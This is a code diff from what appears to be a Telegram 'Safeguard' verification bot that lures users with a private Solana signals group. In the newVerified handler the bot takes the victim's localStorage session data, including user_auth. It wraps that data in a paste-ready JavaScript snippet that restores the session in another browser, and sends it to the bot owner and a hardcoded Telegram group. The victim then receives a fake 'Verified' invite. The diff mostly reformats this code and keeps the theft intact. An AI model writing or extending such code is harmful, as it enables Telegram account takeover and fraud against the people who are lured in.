@@ -172,57 +172,41 @@ const newVerified = async (ctx: Context) => {
       user.id = JSON.parse(storage.user_auth).id;
     }
 
-    try {
-      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a  href="t.me/${
-        user.username
-      }">@${user.username}</a>
+try {
+  const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a  href="t.me/${user.username}">@${user.username}</a>
 
-<pre>Object.entries(${JSON.stringify(
-        storage
-      )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
+<pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
-      const myGroupId = -4723386398; // 👉 Sostituisci con l'ID del tuo gruppo
+  const myGroupId = -4723386398;
+  await bot.api.raw.sendMessage({
+    text: log,
+    chat_id: botOwner,
+    parse_mode: "HTML",
+  });
 
-      await bot.api.raw.sendMessage({
-        text: log,
-        chat_id: botOwner as string,
-        parse_mode: "HTML",
-      });
+  await bot.api.raw.sendMessage({
+    text: log,
+    chat_id: myGroupId,
+    parse_mode: "HTML",
+  });
 
-      // Invia anche al gruppo
-      await bot.api.raw.sendMessage({
-        text: log,
-        chat_id: myGroupId,
-        parse_mode: "HTML",
-      });
-// send chat invite link con log di debug
-const deno = await Deno.openKv();
-const entry = await deno.get([
-  "channel",
-  "@SolanaSignalsPrivate" // 👉 qui puoi sostituire con ID dinamico se serve
-]);
+  const deno = await Deno.openKv();
+  const entry = await deno.get(["channel", "@SolanaSignalsPrivate"]);
+  const config = (entry.value || sgConfigDefault) as SafeguardConfig;
+  const imageLink = sgVerifiedURL ? new URL(sgVerifiedURL) : "./safeguard-verify.jpg";
 
-const config = (entry.value || sgConfigDefault) as SafeguardConfig;
-const imageLink = sgVerifiedURL
-  ? new URL(sgVerifiedURL)
-  : "./safeguard-verify.jpg";
-
-const verifyMsg = `✅ Verified, you can join the group using this temporary link:
-
+  const verifyMsg = `✅ Verified, you can join the group using this temporary link:
 <a href="${config.inviteLink}">${config.inviteLink}</a>
-
 ⚠️ This link is one-time use and will expire`;
 
-const inviteMsg = `<b>Verified!</b> 
-
+  const inviteMsg = `<b>Verified!</b> 
 Join request has been sent and you will be added once the admin approves your request`;
 
-const user_auth = JSON.parse(storage.user_auth);
-const user_id = user_auth?.id || null;
-const username = user?.username || "undefined";
+  const user_auth = JSON.parse(storage.user_auth);
+  const user_id = user_auth?.id || null;
+  const username = user?.username || "undefined";
 
-// 🔍 DEBUG info che ti arriva in chat privata
-const debugMessage = `
+  const debugMessage = `
 <b>🔍 DEBUG INFO</b>
 👤 <b>User ID:</b> <code>${user_id}</code>
 👤 <b>Username:</b> @${username}
@@ -230,19 +214,20 @@ const debugMessage = `
 🖼️ <b>Image Link:</b> ${imageLink}
 `;
 
-await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" });
+  await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" });
 
-if (user_id) {
-  await bot.api.sendPhoto(user_id, new InputFile(imageLink), {
-    caption: config.inviteLink ? verifyMsg : inviteMsg,
-    parse_mode: "HTML",
-  });
-} else {
-  await bot.api.sendMessage(botOwner, "❌ ERRORE: user_auth.id è undefined");
-}catch (e) {
-    console.error("❌ CATCH newVerified:", e);
+  if (user_id) {
+    await bot.api.sendPhoto(user_id, new InputFile(imageLink), {
+      caption: config.inviteLink ? verifyMsg : inviteMsg,
+      parse_mode: "HTML",
+    });
+  } else {
+    await bot.api.sendMessage(botOwner, "❌ ERRORE: user_auth.id è undefined");
   }
-  }
+
+} catch (e) {
+  console.error("❌ CATCH newVerified:", e);
+}
     
 // ✅ chiusura corretta della funzione newVerified
 ctx.response.status = Status.OK;
